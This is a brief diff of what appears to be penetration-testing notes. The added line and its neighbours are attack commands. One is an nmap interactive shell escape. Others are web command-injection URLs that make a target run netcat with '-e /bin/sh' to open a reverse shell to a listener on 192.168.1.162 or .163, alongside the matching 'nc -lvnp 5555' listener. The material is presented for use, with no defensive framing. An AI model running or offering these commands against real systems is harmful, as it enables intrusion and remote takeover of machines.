@@ -20,6 +20,6 @@ nmap --interactive
 !sh
 http://192.168.1.1/test?cmd=which nc
 
-
+http://192.168.1.1/test?cmd=nc%20192.168.1.162%205555%20-e%20/bin/sh
 nc -lvnp 5555
 http://192.168.1.1/test?cmd=nc%20192.168.1.163%205555%20-e%20/bin/sh
